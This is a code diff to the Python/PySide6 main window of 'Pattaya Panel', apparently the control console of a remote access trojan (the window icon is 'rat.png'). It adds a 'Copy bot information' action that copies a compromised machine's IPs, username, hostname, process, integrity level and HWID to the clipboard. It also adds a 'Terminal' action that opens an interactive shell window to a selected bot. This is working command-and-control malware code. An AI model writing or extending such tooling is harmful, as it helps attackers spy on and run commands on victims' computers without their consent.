@@ -1,6 +1,6 @@
 from PySide6.QtCore import Qt,QTimer,QSettings
 from PySide6.QtWidgets import QApplication, QDialog, QMainWindow,QMessageBox,QTableView,QMenu,QLabel,QWidget
-from PySide6.QtGui import QIcon,QAction
+from PySide6.QtGui import QIcon,QAction, QClipboard 
 from core.info import PATTAYA_PANEL_VERSION
 from core.util import PattayaPanelUtil
 from designer.ui_main_window import Ui_MainWindow
@@ -9,9 +9,11 @@ import qdarktheme
 import psutil
 from widget.about_pattaya import AboutPattayaWidget
 from widget.server_setting import PattayaServerSetting
+from widget.terminal import BotTerminalWidget
 
 
 class MainWindow(QMainWindow, Ui_MainWindow):
+
     def __init__(self, app, socket_io_client):
         super().__init__()
         self.setupUi(self)
@@ -23,7 +25,7 @@ class MainWindow(QMainWindow, Ui_MainWindow):
         self.setWindowTitle(self.update_title)
         self.setMaximumSize(16777215, 16777215)
         self.settings = QSettings("unknownclub.net", "Pattaya")
-        
+        self.clipboard = QApplication.clipboard()
         if(self.settings.value("themes") is None):
             self.settings.setValue("themes", 0)
         
@@ -79,10 +81,17 @@ class MainWindow(QMainWindow, Ui_MainWindow):
         # Create a context menu with an action to print the selected row data
         self.context_menu = QMenu(self.bot_table_view)
 
-        self.action_ping_bot = QAction("Ping", self.context_menu)
-        self.action_ping_bot.setIcon(QIcon(":/assets/images/cross.png"))
-        self.action_ping_bot.triggered.connect(self.ping_bot)
-        self.context_menu.addAction(self.action_ping_bot)
+        self.action_copy_bot = QAction("Copy bot information", self.context_menu)
+        self.action_copy_bot.setIcon(QIcon(":/assets/images/books-stack.png"))
+        self.action_copy_bot.triggered.connect(self.copy_bot)
+        self.context_menu.addAction(self.action_copy_bot)
+
+        self.action_bot_terminal = QAction("Terminal", self.context_menu)
+        self.action_bot_terminal.setIcon(QIcon(":/assets/images/terminal.png"))
+        self.action_bot_terminal.triggered.connect(self.bot_terminal)
+        self.context_menu.addAction(self.action_bot_terminal)
+
+        self.actionBot_Terminal.triggered.connect(self.bot_terminal)
 
 
         # Connect the context menu to the table widget
@@ -99,6 +108,9 @@ class MainWindow(QMainWindow, Ui_MainWindow):
         self.actionServer_setting.triggered.connect(self.pattaya_setting)
         self.pattaya_server_setting.setWindowIcon(QIcon(":/assets/images/rat.png"))
 
+        
+        
+
 
 
     def app_exit(self):
@@ -107,10 +119,12 @@ class MainWindow(QMainWindow, Ui_MainWindow):
     def enable_dark_theme(self):
         qdarktheme.setup_theme(custom_colors={"primary": "#FB00FF"})
         self.settings.setValue("themes", 0)
+        PattayaPanelUtil.panel_log_info(f"Selected theme saved!")
 
     def enable_light_theme(self):
         qdarktheme.setup_theme(theme="light",custom_colors={"primary": "#FB00FF"})
         self.settings.setValue("themes", 1)
+        PattayaPanelUtil.panel_log_info(f"Selected theme saved!")
 
     def about_pattaya_project(self):
         self.about_dialog.show()
@@ -125,10 +139,41 @@ class MainWindow(QMainWindow, Ui_MainWindow):
         self.setWindowTitle(self.update_title)
 
 
-    def ping_bot(self):
+    def copy_bot(self):
         item = self.pick_bot()
-        # print(item['wanIp'])
+        if item is None:
+            return
+        self.clipboard.setText(f"""
+Socket ID -> {item['socketId']}
+WAN IP -> {item['wanIp']}
+LAN IP -> {item['lanIp']}
+OS -> {item['os']}
+USERNAME -> {item['username']}
+HOSTNAME -> {item['hostname']}
+PROCESS NAME -> {item['processName']}
+PROCESS ID -> {item['processId']}
+ARCHITECTURE -> {item['architecture']}
+INTEGRITY -> {item['integrity']}
+COUNTRY -> {item['country']}
+LAST SEEN -> {item['lastSeen']}
+HWID -> {item['hwid']}
+        """)
 
+        PattayaPanelUtil.panel_log_info(f"Bot username: {item['username']} was copied")
+
+
+    def bot_terminal(self):
+        item = self.pick_bot()
+        if item is None:
+            return
+        
+        terminal = BotTerminalWidget(item)
+        old_title = terminal.windowTitle()
+        update_title = old_title.replace('$USERNAME', item['username']).replace('$LAN', item['lanIp']).replace('$WAN', item['wanIp']).replace('$INTEGR', item['integrity']).replace('$PN', item['processName'])
+        terminal.setWindowTitle(update_title)
+        PattayaPanelUtil.terminals[item['hwid']] = terminal
+        (PattayaPanelUtil.terminals[item['hwid']]).show()
+        PattayaPanelUtil.panel_log_info(f"Interacting with Bot username: {item['username']}")
 
     def pick_bot(self):
         # Get the currently selected model item data
@@ -136,7 +181,7 @@ class MainWindow(QMainWindow, Ui_MainWindow):
         if selected_indexes:
             selected_index = selected_indexes[0]
             data = selected_index.data()
-            item = self.bots_table_model.internal_data[int(data)-1]
+            item = self.bots_table_model.internal_data[int(data)]
             return item
         else:
             return None
@@ -200,3 +245,8 @@ class MainWindow(QMainWindow, Ui_MainWindow):
 
     def refresh_bot(self):
         self.socket_io_client.socket_io.emit("panel_request_bot_data")
+
+
+
+    def closeEvent(self, event):
+        del PattayaPanelUtil.terminals
